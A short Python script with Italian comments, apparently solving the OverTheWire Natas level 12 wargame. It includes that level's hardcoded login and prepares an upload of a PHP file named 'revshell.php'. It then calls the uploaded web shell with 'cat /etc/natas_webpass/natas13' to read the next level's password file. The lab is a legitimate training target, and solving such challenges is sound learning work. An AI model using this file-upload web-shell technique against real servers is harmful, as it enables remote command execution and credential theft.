#!/bin/python3
# Devo capire come inviare i file con il metodo post in requests
# Leggendo dalla documentazione poiche' il file deve essere inviato per una richiesta multipart/form-data
# bisogna che streammare la richiesta. Questo non e' nativamente supportato da requests ma c'e'
# il link per vedere come si fa
import requests

user = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = 'http://%s.natas.labs.overthewire.org/' % user
obj = {'MAX_FILE_SIZE': '1000', 'filename': 'revshell.php'}
files = {'uploadedfile': open('revshell.php', 'rb')}

sessione = requests.Session()

#post = sessione.post(url, files=files, data=obj, auth=(user, password))
# print(post.text)

get = requests.get(url + 'upload/yuy1xl9bnp.php?c=cat /etc/natas_webpass/natas13',
                   auth=(user, password))
print(get.text)

# /etc/natas_webpass/natas13
